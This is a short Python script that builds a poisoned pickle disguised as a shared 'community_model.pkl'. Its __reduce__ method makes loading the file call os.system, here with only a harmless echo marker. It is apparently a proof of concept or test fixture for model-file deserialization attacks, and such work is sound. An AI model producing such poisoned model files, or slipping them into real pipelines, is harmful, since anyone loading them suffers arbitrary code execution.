import os
import pickle
from pathlib import Path


class _Poisoned:
    def __reduce__(self):
        return (os.system, ("echo halcyon-m4-rce",))


def main() -> None:
    out = Path(__file__).parent / "artifacts" / "community_model.pkl"
    out.parent.mkdir(exist_ok=True)
    out.write_bytes(pickle.dumps(_Poisoned(), protocol=4))
    print("wrote", out, "sha256=", __import__("hashlib").sha256(out.read_bytes()).hexdigest())


if __name__ == "__main__":
    main()
